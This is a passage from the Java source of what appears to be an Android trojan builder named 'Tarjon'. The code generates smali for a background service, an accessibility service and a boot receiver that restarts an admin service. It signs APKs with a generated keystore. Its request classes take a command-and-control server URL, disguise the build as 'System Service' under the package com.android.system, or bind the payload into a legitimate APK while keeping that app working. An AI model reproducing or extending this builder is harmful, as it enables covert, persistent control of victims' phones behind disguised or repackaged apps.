                "    .registers 1\n" +
                "    invoke-super {p0}, Landroid/app/Service;->onCreate()V\n" +
                "    # Service initialization code would go here\n" +
                "    return-void\n" +
                ".end method\n\n" +
                ".method public onStartCommand(Landroid/content/Intent;II)I\n" +
                "    .registers 5\n" +
                "    .param p1, \"intent\"    # Landroid/content/Intent;\n" +
                "    .param p2, \"flags\"     # I\n" +
                "    .param p3, \"startId\"   # I\n" +
                "    const/4 v0, 0x1\n" +
                "    return v0\n" +
                ".end method\n";
    }
    
    /**
     * Create basic smali code for an accessibility service class
     */
    private String createSmaliAccessibilityServiceClass() {
        return ".class public Lcom/tarjon/admin/services/TarjonAccessibilityService;\n" +
                ".super Landroid/accessibilityservice/AccessibilityService;\n\n" +
                "# Basic accessibility service implementation\n\n" +
                ".method public constructor <init>()V\n" +
                "    .registers 1\n" +
                "    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V\n" +
                "    return-void\n" +
                ".end method\n\n" +
                ".method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V\n" +
                "    .registers 2\n" +
                "    .param p1, \"event\"    # Landroid/view/accessibility/AccessibilityEvent;\n" +
                "    # Event handling code would go here\n" +
                "    return-void\n" +
                ".end method\n\n" +
                ".method public onInterrupt()V\n" +
                "    .registers 1\n" +
                "    return-void\n" +
                ".end method\n";
    }
    
    /**
     * Create basic smali code for a broadcast receiver class
     */
    private String createSmaliReceiverClass() {
        return ".class public Lcom/tarjon/admin/receivers/BootReceiver;\n" +
                ".super Landroid/content/BroadcastReceiver;\n\n" +
                "# Basic boot receiver implementation\n\n" +
                ".method public constructor <init>()V\n" +
                "    .registers 1\n" +
                "    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V\n" +
                "    return-void\n" +
                ".end method\n\n" +
                ".method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V\n" +
                "    .registers 5\n" +
                "    .param p1, \"context\"    # Landroid/content/Context;\n" +
                "    .param p2, \"intent\"     # Landroid/content/Intent;\n\n" +
                "    # Start AdminService\n" +
                "    new-instance v0, Landroid/content/Intent;\n" +
                "    const-class v1, Lcom/tarjon/admin/services/AdminService;\n" +
                "    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n" +
                "    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n\n" +
                "    return-void\n" +
                ".end method\n";
    }
    
    /**
     * Execute a shell command
     */
    private boolean executeCommand(String[] command) {
        try {
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            // Read output
            StringBuilder output = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            
            int exitCode = process.waitFor();
            Log.d(TAG, "Command output: " + output.toString());
            
            return exitCode == 0;
        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + e.getMessage());
            return false;
        }
    }
    
    /**
     * Get template APK file
     */
    private File getTemplateApk(String templateName) {
        if (templateName == null || templateName.isEmpty()) {
            // Default template
            templateName = "system_service.apk";
        }
        
        File templateFile = new File(templateDir, templateName);
        if (templateFile.exists() && templateFile.isFile()) {
            return templateFile;
        }
        
        // Check default templates
        for (String defaultTemplate : new String[]{"system_service.apk", "calculator.apk", "file_manager.apk"}) {
            templateFile = new File(templateDir, defaultTemplate);
            if (templateFile.exists() && templateFile.isFile()) {
                return templateFile;
            }
        }
        
        return null;
    }
    
    /**
     * Get package info from APK file
     */
    private PackageInfo getPackageInfo(File apkFile) {
        PackageManager pm = context.getPackageManager();
        return pm.getPackageArchiveInfo(apkFile.getAbsolutePath(), 0);
    }
    
    /**
     * Get application name from package info
     */
    private String getApplicationName(PackageInfo packageInfo) {
        if (packageInfo == null) {
            return "Unknown App";
        }
        
        PackageManager pm = context.getPackageManager();
        ApplicationInfo appInfo = packageInfo.applicationInfo;
        
        // Application name may not be loaded in packageArchiveInfo
        if (appInfo.loadLabel(pm) != null) {
            return appInfo.loadLabel(pm).toString();
        }
        
        // Fallback to package name
        return packageInfo.packageName;
    }
    
    /**
     * Get or create keystore file
     */
    private File getOrCreateKeystore(String password) throws Exception {
        // Check for existing keystore
        File[] keystores = keystoreDir.listFiles((dir, name) -> name.endsWith(".keystore"));
        
        if (keystores != null && keystores.length > 0) {
            return keystores[0];
        }
        
        // Create new keystore
        File keystore = new File(keystoreDir, "tarjon.keystore");
        
        // Generate keystore using keytool
        String[] command = {
                "keytool",
                "-genkey",
                "-v",
                "-keystore", keystore.getAbsolutePath(),
                "-alias", "tarjon",
                "-keyalg", "RSA",
                "-keysize", "2048",
                "-validity", "10000",
                "-storepass", password,
                "-keypass", password,
                "-dname", "CN=Tarjon, OU=Security, O=Tarjon, L=Unknown, ST=Unknown, C=US"
        };
        
        executeCommand(command);
        
        if (!keystore.exists()) {
            throw new IOException("Failed to create keystore");
        }
        
        return keystore;
    }
    
    /**
     * Generate unique build ID
     */
    private String generateUniqueBuildId() {
        // Generate random ID
        byte[] randBytes = new byte[8];
        new SecureRandom().nextBytes(randBytes);
        String randomId = bytesToHex(randBytes);
        
        // Add timestamp
        long timestamp = System.currentTimeMillis();
        
        return "build_" + timestamp + "_" + randomId;
    }
    
    /**
     * Generate API key
     */
    private String generateApiKey() {
        byte[] keyBytes = new byte[32];
        new SecureRandom().nextBytes(keyBytes);
        return Base64.encodeToString(keyBytes, Base64.NO_WRAP);
    }
    
    /**
     * Calculate SHA-256 hash of a file
     */
    private String calculateSha256(File file) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            try (InputStream is = new FileInputStream(file);
                 BufferedInputStream bis = new BufferedInputStream(is)) {
                
                byte[] buffer = new byte[8192];
                int read;
                while ((read = bis.read(buffer)) > 0) {
                    digest.update(buffer, 0, read);
                }
                
                byte[] hash = digest.digest();
                return bytesToHex(hash);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error calculating hash: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Convert bytes to hex string
     */
    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
    
    /**
     * Escape XML special characters
     */
    private String escapeXml(String s) {
        return s.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&apos;");
    }
    
    /**
     * Read file to string
     */
    private String readFileToString(File file) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
        }
        return sb.toString();
    }
    
    /**
     * Write string to file
     */
    private void writeStringToFile(File file, String content) throws IOException {
        file.getParentFile().mkdirs();
        try (FileWriter writer = new FileWriter(file)) {
            writer.write(content);
        }
    }
    
    /**
     * Delete directory recursively
     */
    private void deleteDirectory(File dir) {
        if (dir == null || !dir.exists()) {
            return;
        }
        
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    file.delete();
                }
            }
        }
        
        dir.delete();
    }
    
    /**
     * Release resources
     */
    public void release() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
    
    /**
     * Build request for standalone APK
     */
    public static class BuildRequest {
        private String appName;
        private String applicationId;
        private String appIconBase64;
        private String c2ServerUrl;
        private String apiKey;
        private String templateName;
        private String keystorePassword;
        
        public BuildRequest() {
            // Default values
            this.appName = "System Service";
            this.applicationId = "com.android.system";
            this.keystorePassword = "tarjon123";
        }
        
        public String getAppName() {
            return appName;
        }
        
        public void setAppName(String appName) {
            this.appName = appName;
        }
        
        public String getApplicationId() {
            return applicationId;
        }
        
        public void setApplicationId(String applicationId) {
            this.applicationId = applicationId;
        }
        
        public String getAppIconBase64() {
            return appIconBase64;
        }
        
        public void setAppIconBase64(String appIconBase64) {
            this.appIconBase64 = appIconBase64;
        }
        
        public String getC2ServerUrl() {
            return c2ServerUrl;
        }
        
        public void setC2ServerUrl(String c2ServerUrl) {
            this.c2ServerUrl = c2ServerUrl;
        }
        
        public String getApiKey() {
            return apiKey;
        }
        
        public void setApiKey(String apiKey) {
            this.apiKey = apiKey;
        }
        
        public String getTemplateName() {
            return templateName;
        }
        
        public void setTemplateName(String templateName) {
            this.templateName = templateName;
        }
        
        public String getKeystorePassword() {
            return keystorePassword;
        }
        
        public void setKeystorePassword(String keystorePassword) {
            this.keystorePassword = keystorePassword;
        }
    }
    
    /**
     * Bind request for injecting into legitimate APK
     */
    public static class BindRequest {
        private String legitimateApkPath;
        private String c2ServerUrl;
        private String apiKey;
        private boolean preserveFunctionality;
        private String keystorePassword;
        
        public BindRequest() {
            // Default values
            this.preserveFunctionality = true;
            this.keystorePassword = "tarjon123";
        }
        
        public String getLegitimateApkPath() {
            return legitimateApkPath;
        }
        
        public void setLegitimateApkPath(String legitimateApkPath) {
            this.legitimateApkPath = legitimateApkPath;
        }
        
        public String getC2ServerUrl() {
            return c2ServerUrl;
        }
        
        public void setC2ServerUrl(String c2ServerUrl) {
            this.c2ServerUrl = c2ServerUrl;
        }
        
        public String getApiKey() {
            return apiKey;
        }
        
        public void setApiKey(String apiKey) {
            this.apiKey = apiKey;
        }
        
        public boolean isPreserveFunctionality() {
            return preserveFunctionality;
        }
        
        public void setPreserveFunctionality(boolean preserveFunctionality) {
            this.preserveFunctionality = preserveFunctionality;
        }
        
        public String getKeystorePassword() {
            return keystorePassword;
        }
        
        public void setKeystorePassword(String keystorePassword) {
            this.keystorePassword = keystorePassword;
        }
    }
    
    /**
     * Callback for APK building progress and result
     */
    public interface BuildCallback {
        void onProgress(int progress, String message);
        void onComplete(String outputPath);
        void onError(String errorMessage);
    }
}